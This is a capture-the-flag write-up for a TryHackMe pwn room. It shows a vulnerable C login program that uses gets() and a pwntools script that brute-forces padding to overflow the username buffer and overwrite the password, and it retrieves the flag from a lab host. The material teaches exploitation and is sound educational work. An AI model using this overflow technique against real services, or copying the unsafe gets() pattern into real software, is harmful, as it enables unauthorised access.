
https://tryhackme.com/room/hfb1flagvault

    Today
    Cipher asked me to create the most secure vault for flags, so I created a vault that cannot be accessed. You don't believe me? Well, here is the code with the password hardcoded. Not that you can do much with it anymore.
    
    Connection:
    
     `nc 10.130.166.175 1337`

     Download the source code from [here](https://drive.google.com/file/d/1kYIR2JEfLfbzifHgpGBj2xuBgGxNLp46/view?usp=sharing).

---
Easy  PWN

---
----


## Reconnaisance 

First, I downloaded the source code to inspect the application's logic and identify a possible way to bypass the authentication mechanism.

Here is the provided source code: 

```C 
#include <stdio.h>
#include <string.h>

void print_banner(){
    printf( "  ______ _          __      __         _ _   \n"
        " |  ____| |         \\ \\    / /        | | |  \n"
        " | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
        " |  __| | |/ _` |/ _` `\\/ / _` | | | | | __|\n"
        " | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
        " |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
        "                  __/ |                      \n"
        "                 |___/                       \n"
        "                                             \n"
        "Version 1.0 - Passwordless authentication evolved!\n"
        "==================================================================\n\n"
          );
}

void print_flag(){
    FILE *f = fopen("flag.txt","r");
    char flag[200];

    fgets(flag, 199, f);
    printf("%s", flag);
}

void login(){
    char password[100] = "";
    char username[100] = "";

    printf("Username: ");
    gets(username);

    // If I disable the password, nobody will get in.
    //printf("Password: ");
    //gets(password);

    if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
        print_flag();
    }
    else{
        printf("Wrong password! No flag for you.");
    }
}

void main(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    // Start login process
    print_banner();
    login();

    return;
}
```

The program consists of four main functions:

- `print_banner()` - displays the application banner.
- `print_flag()`- reads the contents of `flag.txt` and prints them to the terminal.
- `login()` - handles the authentication process.
- `main()` - disables buffering for the three standard input/output streams and starts the login process

The most interesting part is the `login()` function, which handles authentication:

```c
void login(){
    char password[100] = "";
    char username[100] = "";

    printf("Username: ");
    gets(username);

    // If I disable the password, nobody will get in.
    //printf("Password: ");
    //gets(password);

    if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte")){
        print_flag();
    }
    else{
        printf("Wrong password! No flag for you.");
    }
}
```

Two character arrays are initialized with empty strings: `password` and `username`. Each array has a size of 100 bytes.

The application then uses:

```C
gets(username);
```

to read user input into the `username` array.

The problem is that gets() is an unsafe function. It reads input without checking the size of the destination buffer. Since username can hold only 100 bytes, providing a longer input can cause a "buffer overflow", allowing us to overwrite adjacent memory.

The next step, which should normally read the password into the `passwird` array , has been commented out:

```C
//printf("Password: ");
//gets(password);
```

As a result, `password` remains an empty string.

However, the following condition still checks both values:

```C
if(!strcmp(username, "bytereaper") && !strcmp(password, "5up3rP4zz123Byte"))
```

In other words, the application expects the username `bytereaper` and the password `
`5up3rP4zz123Byte` 

Under normal circumstances, authentication is impossible because there is no way to enter the password through the intended input flow.

I confirmed this by connection to the service and trying the expected username:

```bash
nc 10.130.166.175 1337
```

The application returned an authentication error:

```text
Username: bytereaper

Wrong password! No flag for you.
```

---


## Exploitation

Since the application uses `gets()` to read the username without validating the input length, I decided to exploit the buffer overflow to overwrite the adjacent `password` variable.

My initial assumption was that the `username` array was located at a lower memory address than the `password` array. If the variables were arranged this way, overflowing `username` could allow me to reach and overwrite `password`.

I prepared the following **payload**:

```python
b"bytereaper\x00" +     # Username
b"X" * pad +            # Padding
b"5up3rP4zz123Byte"     # Password
```

- Username - `bytereaper` followed by a null byte (`\x00`). This terminates the username string, so the first `strcmp()`can still match the expected username.
- Padding - A sequence of `X`characters. Its length determines how many bytes are written between the end of the `username` and the `password` value.
- Password - The hardcoded password that I need to place in the memory occupies by the `password` variable.

Since I did not know the exact distance between the two arrays in memory, I decided to automate the process and try different padding lengths.

I opened my favourite editor, nano, and created a Python script using the `pwntools` library:

```bash
nano flag_vault.py
```

The script looked like this:

```python
from pwn import *

HOST = '10.130.166.175'
PORT = 1337

for pad in range(89, 129):
    io = remote(HOST, PORT)
    io.sendlineafter(
        b"Username:",
        b"bytereaper\x00" + b"X" * pad + b"5up3rP4zz123Byte"
    )

    response = io.recvrepeat(0.5)
    io.close()

    if response and b"Wrong password" not in response:
        print(response)
        break
```

The script connects to the target and iterates through different padding lengths, sending a new payload on each connection.

After every attempt, it checks the server's response. If the response does not contain `Wrong password`, the script prints it and stops.

I started with 89 bytes of padding. This value comes from the size of the `username` buffer (100 bytes), minus the 11 bytes occupies by `bytereaper` and its terminating `null` byte.

I then tested padding values up to 128 bytes to account for a possible gap between the two variables.

I ran the script:

```bash
python3 ./flag_vault.py
```

The output showed multiple connection attempts:

```bash
[+] Opening connection to 10.130.166.175 on port 1337: Done
[*] Closed connection to 10.130.166.175 port 1337
[+] Opening connection to 10.130.166.175 on port 1337: Done
....
....
[*] Closed connection to 10.130.166.175 port 1337
[+] Opening connection to 10.130.166.175 on port 1337: Done
[*] Closed connection to 10.130.166.175 port 1337

b'THM{REDACTED}\n'
```

The payload successfully overwrote the password variable, allowing the authentication check to pass.

Flag obtained

---


## Summary

1. **Reconnaissance** — Downloaded and analysed the provided C source code, identifying the authentication logic and the unsafe `gets()` function.
2. **Vulnerability Identification** — Found that the password input was disabled, making normal authentication impossible.
3. **Exploitation** — Used a stack-based buffer overflow to overwrite the adjacent `password` variable while keeping the username valid.
4. **Automation** — Developed a Python script with `pwntools` to brute-force the required padding length and retrieve the flag.
